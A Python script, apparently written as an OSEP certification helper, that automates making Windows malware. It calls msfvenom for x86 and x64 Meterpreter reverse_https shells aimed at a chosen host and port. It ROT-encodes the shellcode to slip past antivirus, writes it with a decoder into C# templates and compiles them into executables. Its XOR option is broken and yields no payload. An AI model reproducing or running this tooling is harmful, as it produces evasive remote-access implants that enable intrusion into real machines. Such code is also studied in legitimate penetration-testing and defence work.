#/usr/bin/python3

import argparse
import os
import glob
import random
import string
import json
import itertools
import base64

def cheers():
    print()
    print("[+] We're all done here")
    print("[+] Now go and get this certification :)")

def exe_will_rain():
    print("[+] Starting to compile CS files..")

    try:
        for filename in glob.glob("output/32*.cs"):
            command = "mcs -platform:x86 -unsafe %s"%(filename)
            print("[+] Compiling: ",command)
            os.system(command)
            print()

        for filename in glob.glob("output/64*.cs"):
            command = "mcs -platform:x64 -unsafe %s"%(filename)
            print("[+] Compiling: ",command)
            os.system(command)
            print()

    except Exception as e:
        print(str(e))
        quit()

       
def template_filling(shell_mark, dec_mark, dec_routine, buf: str, arch:int):
    print("[+] The mark where shellcode will be inserted is: '%s'"%(shell_mark))
    print("[+] Starting to fill up templates..")

    if arch == 32:
        key = "32"
    elif arch == 64:
        key = "64"

    byte_len = buf.count("0x")

    crafted_payload = "byte[] buf = new byte[%d] {%s};"%(byte_len, buf)

    #print(crafted_payload)

    try:
        for filename in os.listdir("templates"):
            with open(os.path.join("templates", filename), 'r') as f:
                text = f.read()
                shell_text = text.replace(shell_mark, crafted_payload, 1)
                result_text = shell_text.replace(dec_mark, dec_routine, 1)
                #print(result_text)
                with open(os.path.join("output", key+filename), 'w') as r:
                    r.write(result_text)

    except Exception as e:
        print(str(e))
        quit()

    print("[+] Done!")


def rot_encoding(content_32, content_64):
    # Thanks to https://www.abatchy.com/2017/05/rot-n-shellcode-encoder-linux-x86

    key:int = random.randrange(1,25)
    print("[+] Encoding shellcode with ROT%d"%(key))

    enc_content_32 = ""
    enc_content_64 = ""
    dec_routine = """
    for (int i = 0; i < buf.Length; i++)
    {
        buf[i] = (byte)(((uint)buf[i] - %d) & 0xFF);
    }
    """%(key)

    try:
        for i in bytearray.fromhex(content_32):
            j = (i + key)%256
            enc_content_32 += '0x'
            enc_content_32 += '%02x,' %j

        enc_content_32 = enc_content_32[:-1]
        
        for i in bytearray.fromhex(content_64):
            j = (i + key)%256
            enc_content_64 += '0x'
            enc_content_64 += '%02x,' %j

        enc_content_64 = enc_content_64[:-1]

    except Exception as e:
        print(str(e))
        quit()

    #print(enc_content_32)
    return enc_content_32, enc_content_64, dec_routine

def xor_crypt_string(data, key):
    # thanks to https://www.tutorialspoint.com/cryptography_with_python/cryptography_with_python_xor_process.htm
   xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, itertools.cycle(key)))

   return xored 

def xor_encoding(content_32, content_64):
    enc_content_32 = ""
    enc_content_64 = ""
    try:
        letters = string.ascii_lowercase
        key = ''.join(random.choice(letters) for i in range(16))
        print("[+] Encoding shellcode with XOR key: %s"%(key))

        xor_32 = xor_crypt_string(content_32, key)
        #print("XOR'ed content32: ")
        #print(enc_content_32)

        xor_64 = xor_crypt_string(content_64, key)
        #print("XOR'ed content64: ")
        #print(enc_content_64)

        plain_32 = xor_crypt_string(xor_32, key)
        print("UNXOR'ed content32: ")
        print(plain_32)

    except Exception as e:
        print(str(e))
        quit()

    try:
        for i in bytearray.fromhex(xor_32):
            j = i 
            enc_content_32 += '0x'
            enc_content_32 += '%02x,' %j

        enc_content_32 = enc_content_32[:-1]
        
        for i in bytearray.fromhex(xor_64):
            j = i
            enc_content_64 += '0x'
            enc_content_64 += '%02x,' %j

        enc_content_64 = enc_content_64[:-1]

    except Exception as e:
        print(str(e))
        quit()


def msf_gen(l:str, p:int):
    print("[+] Generating x86 and x64 MSF HTTPS staged payloads, for %s:%d"%(l,p))

    try:
        msf_1 = "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=%s EXITFUNC=thread LPORT=%d -f hex -o met64.hex"%(l,p)
        print("[+] Executing: ", msf_1)
        print()
        os.system(msf_1)
        print()
        
        msf_2 = "msfvenom -p windows/meterpreter/reverse_https LHOST=%s EXITFUNC=thread LPORT=%d -f hex -o met32.hex"%(l,p)
        print("[+] Executing: ", msf_2)
        print()
        os.system(msf_2)
        print()

        with open("met32.hex", "r") as file:
            content_32 = file.read()

        with open("met64.hex", "r") as file:
            content_64 = file.read()
        
    except Exception as e:
        print(str(e))
        quit()

    return content_32, content_64


def cli_parser():
    parser = argparse.ArgumentParser(description='OSEP payload generator for lazy pentesters. msfvenom and mcs need to be installed and in path.')
    parser.add_argument('-l', help='-l LHOST', type=str)
    parser.add_argument('-p', help='-p LPORT', type=int)
    parser.add_argument('-e', help='-e ENCODING', type=str)
    args = parser.parse_args()
    
    if (args.l == None or args.p == None or args.e == None):
        parser.print_help()
        quit()

    return args.l, args.p, args.e


if __name__=="__main__":
    #Get IP and port from command line arguments
    l:str
    p:int
    e:str
    l, p, e = cli_parser()

    #Generating corresponding meterpreter payloads
    content_32:str
    content_64:str
    content_32, content_64 = msf_gen(l, p)

    
    shell_mark:str = "!!!_SHELLCODE_MARK!!!"
    dec_mark:str = "!!!DECODE_ROUTINE!!!"
    dec_routine:str = ""

    if str(e).upper() == "ROT":
        # Encoding with ROT
        content_32, content_64, dec_routine = rot_encoding(content_32,content_64)
        #Open all files in "templates" folder, and swap the content with the payloads
        template_filling(shell_mark, dec_mark, dec_routine, content_32, 32)
        template_filling(shell_mark, dec_mark, dec_routine, content_64, 64)
    elif str(e).upper() == "XOR":
        # Encoding with XOR
        xor_encoding(content_32, content_64)
        quit()
    else:
        print("[-] Did you set a supported encoding method?")
        quit()

    #Compiling all CS files for you bro
    exe_will_rain()

    #Only cheers up the amazing pentesters
    cheers()